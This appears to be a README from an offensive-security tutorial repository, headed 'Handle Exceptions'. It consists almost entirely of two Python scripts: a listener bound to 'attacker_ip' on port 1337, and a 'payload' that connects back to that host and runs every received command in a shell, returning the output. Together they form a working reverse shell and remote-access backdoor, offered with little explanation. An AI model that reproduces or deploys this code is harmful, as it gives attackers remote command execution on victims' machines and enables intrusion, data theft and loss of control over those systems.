<h2 align="center">Handle Exceptions</h2>
<p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>

- - - - - - - - - - - - - - - - - - - - - -
> [listener.py](listener.py)
```python
import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()

def recv_data():
    original_size = connection.recv(2048).decode("utf-8")
    original_size = int(original_size)
    
    data = connection.recv(2048) # data at instance
    while len(data) != original_size:
        data = data + connection.recv(2048)
    return data

while True:
	cmd = input("enter a command: ")
	
	if cmd == "quit":
		connection.send(b"quit") # string
		connection.close()
		break
		
	connection.send(bytes(cmd, "utf-8"))
	
	output = recv_data()
	print(output.decode("utf-8"))

print("Server has stopped")
```
---
> [payload.py](payload.py)
```python
import socket
import subprocess

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

def send_data(ouput_data):
    size_of_data = len(ouput_data)
    size_of_data = str(size_of_data)
    payload.send(bytes(size_of_data, "utf-8"))
    payload.send(ouput_data)
 
while True:
	cmd = payload.recv(2048)
	
	if cmd == b"quit":
		payload.close()
		break
		
	cmd = cmd.decode("utf-8") # string
	output = subprocess.check_output(cmd, shell = True)
	send_data(output)

print("Disconnected") # display disconnection message
```